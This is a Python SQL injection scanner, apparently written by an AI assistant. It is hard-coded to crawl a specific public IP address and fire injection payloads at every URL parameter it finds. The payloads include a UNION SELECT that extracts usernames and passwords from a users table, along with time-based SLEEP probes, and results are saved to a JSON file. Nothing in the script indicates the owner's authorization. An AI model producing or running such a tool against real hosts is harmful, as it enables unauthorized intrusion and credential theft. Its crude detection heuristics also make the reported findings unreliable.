#!/usr/bin/env python3
"""
SQLi Scanner - Crawls a website and tests all URL parameters for SQL Injection.
Target: http://52.247.225.51
Author: AI Assistant
Python 3.8+
"""

import requests
from urllib.parse import urlparse, parse_qs, urljoin
import re
import time
import concurrent.futures
from collections import deque
import json

# ================= CONFIGURATION =================
TARGET = "http://52.247.225.51"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLi-Scanner/1.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}
TIMEOUT = 10
MAX_DEPTH = 3
MAX_WORKERS = 10
OUTPUT_FILE = "sqli_results.json"

# Standard SQLi payloads (error, boolean, union, time-based)
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "1' AND SLEEP(5)--",
    "' OR 1=1--",
    "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --"
]

# Static assets to ignore during crawling
STATIC_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.svg', '.ico', '.pdf'}

# ================= CRAWLER =================
def is_static(url):
    parsed = urlparse(url)
    return any(parsed.path.lower().endswith(ext) for ext in STATIC_EXTENSIONS)

def crawl_site(base_url, max_depth=3):
    visited = set()
    queue = deque([(base_url, 0)])
    urls_with_params = []
    target_netloc = urlparse(base_url).netloc

    print(f"[*] Crawling {base_url} (max depth: {max_depth})...")
    
    while queue:
        url, depth = queue.popleft()
        
        if url in visited or depth > max_depth:
            continue
        visited.add(url)

        # Extract query parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            urls_with_params.append((url, {k: v[0] for k, v in params.items()}))

        # Fetch page to find links
        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
            if resp.status_code != 200 or is_static(url):
                continue
                
            # Extract hrefs
            links = re.findall(r'href=["\']([^"\']+)["\']', resp.text)
            for link in links:
                full_link = urljoin(base_url, link)
                parsed_full = urlparse(full_link)
                
                # Only same domain, no fragments, not static
                if (parsed_full.netloc == target_netloc and 
                    parsed_full.scheme in ('http', 'https') and
                    '#' not in full_link and
                    full_link not in visited):
                    queue.append((full_link, depth + 1))
        except requests.RequestException:
            continue

    print(f"[+] Found {len(urls_with_params)} URLs with query parameters.")
    return urls_with_params

# ================= SQLI TESTER =================
def test_sqli(url, params):
    results = []
    
    # Get baseline response for comparison
    try:
        baseline_resp = requests.get(url, params=params, headers=HEADERS, timeout=TIMEOUT)
        baseline_len = len(baseline_resp.text)
    except Exception:
        return results

    for param_name in params:
        original_val = params[param_name]
        
        for payload in SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = f"{original_val}{payload}"
            
            try:
                resp = requests.get(url, params=test_params, headers=HEADERS, timeout=TIMEOUT)
                is_vuln = False
                reason = ""

                # 1. Error-based detection
                if re.search(r"(SQL syntax|MySQL|PostgreSQL|Oracle|SQLite|Warning|Error|Unclosed quotation)", resp.text, re.I):
                    is_vuln = True
                    reason = "Error-based"
                
                # 2. Boolean/Content-based detection (length or keyword change)
                elif len(resp.text) != baseline_len or any(kw in resp.text.lower() for kw in ["admin", "root", "password", "user"]):
                    is_vuln = True
                    reason = "Boolean/Content-based"

                # 3. Time-based detection (if not already flagged)
                if not is_vuln:
                    time_params = params.copy()
                    time_params[param_name] = f"{original_val} AND SLEEP(4)--"
                    start = time.time()
                    requests.get(url, params=time_params, headers=HEADERS, timeout=10)
                    elapsed = time.time() - start
                    if elapsed > 3.0:
                        is_vuln = True
                        reason = "Time-based"

                if is_vuln:
                    results.append({
                        "url": url,
                        "param": param_name,
                        "payload": payload,
                        "type": reason,
                        "response_length": len(resp.text),
                        "status_code": resp.status_code
                    })
            except Exception as e:
                continue
                
    return results

# ================= MAIN EXECUTION =================
def main():
    print(f"🎯 Target: {TARGET}")
    
    # 1. Crawl & extract parameters
    urls_to_test = crawl_site(TARGET, MAX_DEPTH)
    if not urls_to_test:
        print("[!] No query parameters found to test.")
        return

    vuln_results = []
    total_tests = len(urls_to_test) * len(SQLI_PAYLOADS)
    
    print(f"[*] Testing {total_tests} parameter/payload combinations...")
    
    # 2. Parallel scanning
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(test_sqli, url, params) for url, params in urls_to_test]
        
        completed = 0
        for future in concurrent.futures.as_completed(futures):
            try:
                vuln_results.extend(future.result())
                completed += 1
                print(f"\r[+] Scanned {completed}/{total_tests} combinations...", end="", flush=True)
            except Exception as e:
                print(f"\n[-] Worker error: {e}")

    # 3. Output results
    if vuln_results:
        print("\n\n" + "="*60)
        print("🚨 SQL INJECTION VULNERABILITIES FOUND 🚨")
        print("="*60)
        
        for i, r in enumerate(vuln_results, 1):
            print(f"\n[{i}] URL: {r['url']}")
            print(f"    Param: {r['param']}")
            print(f"    Payload: {r['payload']}")
            print(f"    Type: {r['type']}")
            print(f"    Status: {r['status_code']} | Length: {r['response_length']}")
            print("-"*60)

        # Save to JSON
        with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
            json.dump(vuln_results, f, indent=2)
        print(f"\n💾 Results saved to {OUTPUT_FILE}")
    else:
        print("\n[+] No SQLi vulnerabilities detected.")

if __name__ == "__main__":
    main()
